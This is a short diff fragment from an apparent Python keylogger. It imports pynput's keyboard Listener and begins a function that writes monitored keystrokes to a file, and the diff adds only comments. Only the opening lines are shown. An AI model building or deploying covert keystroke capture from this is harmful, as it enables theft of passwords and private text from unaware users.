@@ -1,6 +1,7 @@
 from pynput.keyboard import Listener
+#import done 
 
-
+#function for wrriting what we have monitored
 def write_to_file(key):
     letter = str(key)
     letter = letter.replace("'", "")
